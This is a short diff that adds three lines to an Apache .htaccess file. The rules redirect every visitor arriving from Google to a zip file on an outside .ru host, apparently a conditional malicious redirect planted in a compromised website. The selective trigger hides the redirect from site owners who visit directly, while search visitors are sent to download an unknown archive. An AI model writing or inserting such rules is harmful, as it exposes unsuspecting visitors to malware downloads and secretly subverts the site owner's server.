@@ -1,0 +1,3 @@
+RewriteEngine on
+RewriteCond %{HTTP_REFERER} ^(.*)google\.(.*)
+RewriteRule .* http://testswork.ru/info.zip [L]
